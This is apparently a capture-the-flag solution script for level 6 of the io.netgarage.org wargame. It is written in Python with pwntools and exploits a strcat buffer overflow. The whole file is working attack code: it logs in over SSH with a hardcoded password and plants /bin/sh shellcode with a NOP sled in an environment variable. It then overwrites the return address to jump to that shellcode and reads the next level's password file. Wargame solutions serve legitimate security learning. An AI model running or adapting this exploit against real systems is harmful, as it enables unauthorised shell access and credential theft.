from pwn import *
s = ssh(user='level6', host='io.netgarage.org', password='fQ8W8YlSBJBWKV2R', port=22)
# game at http://io.netgarage.org/
# a simple buffer overflow with code redirection to shellcode
# strcat causes buffer greeting to overflow
# source /usr/local/peda/peda.py to get peda
sh = s.run('bash')
# If it is not created already make a file that gets the
# memory address of an environment variable to the exploit can point to eip to it
# sh.sendline(b'mkdir /tmp/thel')
# s.put('getenv.c', remote='/tmp/thel')
# sh.sendline(b'cd /tmp/thel; gcc -o getenv getenv.c; cd ~')
# print(sh.recvline(timeout=1))
# set environment variable to French so the greeting makes the string longer
exploit = b'export LANG=fr;'
# create an environment variable to hold the shellcode
exploit += b'export SHELLCODE=$(python -c \'print \"\\x90\"*40+'
exploit += b'\"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\"\')'
sh.sendline(exploit)
print(exploit)
sh.sendline(b'/tmp/thel/getenv SHELLCODE')
result = sh.recvline(timeout=1).decode('utf-8').strip('\n')
shellcode_addr = result[result.find('> ')+2:]
log.info("Shellcode is at address: " + shellcode_addr)
exploit = b'/levels/level06 $(python -c \'print \"\x90\"*40+\" \"+\"\x90\"*26+'
exploit += b'\"'+p32(int(shellcode_addr, 16))+b'\"\')'
print(exploit)
sh.sendline(exploit)
for i in range(2):
    print(sh.recvline(timeout=2))
sh.sendline(b'cat /home/level7/.pass')
log.info('Password : '+sh.recvline(timeout=2).decode('utf-8')[7:])
s.close()
